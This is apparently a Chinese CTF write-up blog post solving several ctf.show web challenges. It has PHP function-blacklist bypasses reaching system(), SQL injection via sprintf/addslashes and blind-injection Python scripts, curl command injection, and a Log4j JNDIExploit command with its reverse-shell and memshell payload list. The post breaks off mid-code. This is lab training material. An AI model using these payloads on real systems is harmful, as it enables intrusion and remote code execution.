<h2 id="红包题-耗子尾汁"><a href="#红包题-耗子尾汁" class="headerlink" title="红包题 耗子尾汁"></a>红包题 耗子尾汁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">function CTFSHOW_36_D($a,$b)&#123;</span><br><span class="line">    $dis = array(&quot;var_dump&quot;,&quot;exec&quot;,&quot;readfile&quot;,&quot;highlight_file&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;,&quot;&quot;);</span><br><span class="line">    $a = strtolower($a);</span><br><span class="line">    if (!in_array($a,$dis,true)) &#123;</span><br><span class="line">        forward_static_call_array($a,$b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">CTFSHOW_36_D($a,$b);</span><br><span class="line">echo &quot;rlezphp!!!&quot;;</span><br></pre></td></tr></table></figure>

<p>主要的重点就是通过forward_static_call_array的回调函数来调用函数，但是forward_static_call_array仅能使用静态的函数，所以eval，include这类函数就没法用</p>
<p>两种解法</p>
<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>寻找一个没在黑名单内的回调函数，通过forward_static_call_array调用这个回调函数，再调用真正的恶意函数</p>
<p>参考-&gt;<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<p>奇特的是，黑名单内没有本身这个forward_static_call_array，而且register_shutdown_function也打成了registregister_shutdown_function，所以可以任选一个函数来打</p>
<p>要求回调的第二个参数时array，所以可以构造这样一个链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forward_static_call_array-&gt;forward_static_call_array-&gt;system-&gt;&#x27;ls&#x27;</span><br></pre></td></tr></table></figure>

<p>其中forward_static_call_array为$a，system-&gt;’ls’为$b，且$b为array</p>
<blockquote>
<h3 id="说明-¶"><a href="#说明-¶" class="headerlink" title="说明 ¶"></a>说明<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.forward-static-call-array.php#refsect1-function.forward-static-call-array-description"> ¶</a></h3><p>forward_static_call_array(<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.callable.php">callable</a> $callback, array $args): <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a></p>
<p>通过 <code>callback</code> 参数指定调用用户定义的函数或者方法。此函数必须在方法上下文中调用，不能在类外使用。它使用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.late-static-bindings.php">后期静态绑定</a>。转发方法的所有参数都作为值和数组传递，类似于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func-array.php">call_user_func_array()</a>。</p>
<table>
<thead>
<tr>
<th>注意 forward_static_call_array() 的参数不是通过引用传递的。</th>
</tr>
</thead>
</table>
</blockquote>
<p>有个坑点就是这个$b为二维数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ar = array(</span><br><span class="line">        &quot;system&quot;,</span><br><span class="line">        array(&quot;ls&quot;)</span><br><span class="line">);</span><br><span class="line">=&gt;array(2) &#123; [0]=&gt; string(6) &quot;system&quot; [1]=&gt; array(1) &#123; [0]=&gt; string(2) &quot;ls&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>其中array[0]作为套娃中forward_static_call_array的第一个参数，指定了使用的静态函数名。array[1]作为forward_static_call_array的第二个参数，作为array传入静态函数中</p>
<p>所以payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=forward_static_call_array&amp;b[]=system&amp;b[][]=ls</span><br></pre></td></tr></table></figure>

<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><blockquote>
<p>在php当中默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
<p>注意访问任意全局类、函数或常量，都可以使用完全限定名称，例如 \strlen() 或 \Exception 或 \INI_ALL。</p>
<p>在命名空间内部访问全局类、函数和常量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;namespace Foo;</span><br><span class="line"></span><br><span class="line">&gt;function strlen() &#123;&#125;</span><br><span class="line">&gt;const INI_ALL = 3;</span><br><span class="line">&gt;class Exception &#123;&#125;</span><br><span class="line"></span><br><span class="line">&gt;$a = \strlen(&#x27;hi&#x27;); // 调用全局函数strlen</span><br><span class="line">&gt;$b = \INI_ALL; // 访问全局常量 INI_ALL</span><br><span class="line">&gt;$c = new \Exception(&#x27;error&#x27;); // 实例化全局类 Exception</span><br><span class="line">&gt;?&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>先要引入一个命名空间的了解，在php中默认的命名空间是\，如果不事先写，所有函数都在全局空间中使用，这就有可能造成函数名冲突</p>
<p>所以不难想到直接使用绝对路径调用system函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\system&amp;b[]=cat flag.php</span><br></pre></td></tr></table></figure>

<h2 id="新年好"><a href="#新年好" class="headerlink" title="新年好?"></a>新年好?</h2><p>js题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#x27;/flag&#x27;, function (req, res) &#123;</span><br><span class="line">    function getflag(flag) &#123;</span><br><span class="line">      res.send(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    let delay = 10 * 1000;</span><br><span class="line">    if (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(getflag, delay,flag);</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      try &#123;</span><br><span class="line">        res.send(&#x27;Timeout!&#x27;);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>先定义了一个delay变量为10s，然后再和req.query.delay，传入的参数delay取更大的数</p>
<p>然后用delay作为设置超时的函数，这一眼就是溢出，直接把delay往大了填</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?delay=99999999999999999999</span><br></pre></td></tr></table></figure>



<h2 id="红包一"><a href="#红包一" class="headerlink" title="红包一"></a>红包一</h2><p>F12</p>
<h2 id="Log4j复现"><a href="#Log4j复现" class="headerlink" title="Log4j复现"></a>Log4j复现</h2><p>最难复现的一集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 89.117.226.223 -p 8888 -l 1234</span><br></pre></td></tr></table></figure>

<p>起一个log4j exp服务，然后用这个服务里的Basic&#x2F;TomcatEcho，在访问头里加个cmd:ls能直接打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Supported LADP Queries</span><br><span class="line">* all words are case INSENSITIVE when send to ldap server</span><br><span class="line"></span><br><span class="line">[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/JettyMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/JBossMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WebsphereMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells</span><br><span class="line"></span><br><span class="line">[+] TomcatBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] GroovyBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line"></span><br><span class="line">[+] WebsphereBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</span><br></pre></td></tr></table></figure>

<p>难复现的一b，傻逼东西</p>
<h2 id="给她"><a href="#给她" class="headerlink" title="给她"></a>给她</h2><p>dirb扫出.git泄露，直接githack抓下来个hint.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass=sprintf(&quot;and pass=&#x27;%s&#x27;&quot;,addslashes($_GET[&#x27;pass&#x27;]));</span><br><span class="line">$sql=sprintf(&quot;select * from user where name=&#x27;%s&#x27; $pass&quot;,addslashes($_GET[&#x27;name&#x27;]));</span><br></pre></td></tr></table></figure>

<p>主要的问题出现在$sql中，使用了第二次sprintf操作，而且$pass的值相对可控</p>
<p>sprintf用于把格式化的字符串写入一个变量中</p>
<p>而用于接收的字符格式值固定：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%% -&gt; 返回一个百分号 %，%b -&gt; 二进制数，%s -&gt; 字符串</span><br><span class="line">等</span><br></pre></td></tr></table></figure>

<p>当%后所指定的类型是无法识别占位符类型时，sprintf会将其置空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;this_is_%&#x27;&quot;-&gt;sprintf处理，由于%&#x27;不被识别，置空-&gt;&quot;this_is_&quot;</span><br></pre></td></tr></table></figure>

<p>所以利用这个特性进行绕过addslashes</p>
<p>第一次addslashes+sprintf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;pass&#x27;]=test%1$&#x27;#</span><br><span class="line">$pass=&quot;and pass=test%1$\&#x27;#&quot;</span><br></pre></td></tr></table></figure>

<p>第二次addslashes+sprintf，$pass直接被拼接进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from user where name=&#x27;%s&#x27; and pass=&#x27;test%1$\&#x27;#&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>就在这个时候，对$sql进行sprintf处理，%1$\被置空，留下来的就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name=&#x27;%s&#x27; and pass=&#x27;test&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>成功闭合</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=1&amp;pass=%1$&#x27; or 1=1%23</span><br></pre></td></tr></table></figure>

<p>进去第二步明显发现页面不对，看一眼流量，注意到cookie有file字段，CyberChef直接打出来是string转16进制，读&#x2F;flag文件就行</p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">        system(&quot;curl https://&quot;.$_GET[&#x27;url&#x27;].&quot;.ctf.show&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=baidu.com%26%26cat%20flag%26%26</span><br></pre></td></tr></table></figure>

<h2 id="假赛生"><a href="#假赛生" class="headerlink" title="假赛生"></a>假赛生</h2><p>就是各种利用空格</p>
<p>提示register.php和login.php，还给了index源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">if(empty($_SESSION[&#x27;name&#x27;]))&#123;</span><br><span class="line">    show_source(&quot;index.php&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $name=$_SESSION[&#x27;name&#x27;];</span><br><span class="line">    $sql=&#x27;select pass from user where name=&quot;&#x27;.$name.&#x27;&quot;&#x27;;</span><br><span class="line">    echo $sql.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    system(&#x27;4rfvbgt56yhn.sh&#x27;);</span><br><span class="line">    $query=mysqli_query($conn,$sql);</span><br><span class="line">    $result=mysqli_fetch_assoc($query);</span><br><span class="line">    if($name===&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo &quot;admin!!!!!&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">        if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">            preg_replace_callback(&quot;/\w\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);</span><br><span class="line">            echo $flag;</span><br></pre></td></tr></table></figure>

<p>看起来没有能session反序列化的地方，register尝试注册admin不允许</p>
<p>但是在sql中，空格的操作还挺有意思</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `admininfo` where realname = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>这个时候如果表中有名为”admin “的数据（带了个空格），也是能被一起查询出来的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312061210488.png" alt="image-20231206121034404"></p>
<p>注册的时候传入的”admin”和”admin “又是两个不同的字符串，所以直接注册”admin “，登陆”admin”就行</p>
<p>第二步就是绕过判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace_callback(&quot;/\w\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);</span><br></pre></td></tr></table></figure>

<p>直接fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import regex</span><br><span class="line"></span><br><span class="line">fuzz = string.printable</span><br><span class="line">for i in fuzz:</span><br><span class="line">    if not regex.match(r&quot;\w\W*&quot;, i):</span><br><span class="line">        print(i, end = &quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>打出来的结果是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|&#125;~ 	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>随便传个?c&#x3D;!就行</p>
<h2 id="萌新记忆"><a href="#萌新记忆" class="headerlink" title="萌新记忆"></a>萌新记忆</h2><p>进去扫网出来个&#x2F;admin</p>
<p>sql先试探一下，password部分估计是md5，没法闭合，username单引号闭合，简单fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://dcf0879c-3bff-4175-817e-a3a631e1dfc0.challenge.ctf.show/admin/checklogin.php&quot;</span><br><span class="line">fuzz = string.printable</span><br><span class="line">sql_payload = [&quot;select&quot;, &quot;union&quot;, &quot;or&quot;, &quot;and&quot;, &quot;||&quot;, &quot;&amp;&amp;&quot;, &quot;from&quot;, &quot;where&quot;, &quot;order&quot;, &quot;group&quot;, &quot;by&quot;, &quot;having&quot;, &quot;like&quot;,</span><br><span class="line">               &quot;updatexml&quot;, &quot;order&quot;, &quot;exp&quot;, &quot;floor&quot;, &quot;rand&quot;, &quot;extractvalue&quot;, &quot;geometrycollection&quot;, &quot;multipoint&quot;,</span><br><span class="line">               &quot;polygon&quot;, &quot;multipolygon&quot;, &quot;linestring&quot;, &quot;multilinestring&quot;, &quot;sleep&quot;, &quot;length&quot;, &quot;substr&quot;, &quot;mid&quot;, &quot;ascii&quot;,</span><br><span class="line">               &quot;ord&quot;, &quot;if&quot;, &quot;/**/&quot;, &quot;//&quot;]</span><br><span class="line">for i in fuzz:</span><br><span class="line">    re = requests.post(url, data = &#123;&quot;u&quot;: i, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">    if &quot;我报警了&quot; in re.text:</span><br><span class="line">        print(i, end = &quot; &quot;)</span><br><span class="line">for sqls in sql_payload:</span><br><span class="line">    re = requests.post(url, data = &#123;&quot;u&quot;: sqls, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">    if &quot;我报警了&quot; in re.text:</span><br><span class="line">        print(sqls, end = &quot; &quot;)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! &quot; # % &amp; * + - . : ; = &gt; ? @ ] ^ _ ` &#123; &#125; ~ select union or and &amp;&amp; from where order by having like order floor rand sleep mid ascii ord if /**/</span><br></pre></td></tr></table></figure>

<p>那其实也没办法闭合了</p>
<p>可以猜测一下里边的sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username = &#x27;$_POST[&quot;u&quot;]&#x27; and &#x27;$_POST[&quot;p&quot;]&#x27;;</span><br></pre></td></tr></table></figure>

<p>还有一个知识点是应该知道的，就是<code>在sql语句中 and级别高于or</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312061625942.png" alt="image-20231206162545901"></p>
<p>先<code>1=1 and password = &#39;t&#39;</code>进行运算，得到结果<code>1</code>，然后再<code>where realname = &#39;admin&#39; or 1</code> 得到永真</p>
<p>所以这里就可以直接插一条sub来盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">letter = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">url = &quot;http://dcf0879c-3bff-4175-817e-a3a631e1dfc0.challenge.ctf.show/admin/checklogin.php&quot;</span><br><span class="line">for times in range(1, 20):</span><br><span class="line">    for i in letter:</span><br><span class="line">        payload = &quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&#123;&#125;&quot;.format(times, i)</span><br><span class="line">        re = requests.post(url, data = &#123;&quot;u&quot;: payload, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">        if re.text == &quot;密码错误&quot;:</span><br><span class="line">            print(letter[letter.find(i) - 1], end = &quot;&quot;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>密码打出来去掉两个ZZ登陆就行</p>
<p>抽象的是payload还不能带空格，哈哈</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>一眼丁真<a target="_blank" rel="noopener" href="http://www.zip泄密,/">www.zip泄密，</a></p>
<p>拉出来代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">waf_login:</span><br><span class="line">if(preg_match(&quot;/load|and|or|\||\&amp;|select|union|\&#x27;|=| |\\\|,|sleep|ascii/i&quot;,$arr))</span><br><span class="line">waf_register:</span><br><span class="line">if(preg_match(&quot;/load|and|\||\&amp;| |\\\|sleep|ascii|if/i&quot;,$arr))</span><br><span class="line">register.php:</span><br><span class="line">if(isset($_POST[&#x27;e&#x27;])&amp;&amp;isset($_POST[&#x27;u&#x27;])&amp;&amp;isset($_POST[&#x27;p&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$e=$_POST[&#x27;e&#x27;];</span><br><span class="line">$u=$_POST[&#x27;u&#x27;];</span><br><span class="line">$p=$_POST[&#x27;p&#x27;];</span><br><span class="line">$sql =</span><br><span class="line">&quot;insert into test1</span><br><span class="line">set email = &#x27;$e&#x27;, </span><br><span class="line">username = &#x27;$u&#x27;,</span><br><span class="line">password = &#x27;$p&#x27;</span><br><span class="line">&quot;;</span><br><span class="line">user.php</span><br><span class="line">if (is_numeric($username))</span><br><span class="line">	&#123;	</span><br><span class="line">		if(strlen($username)&gt;10) 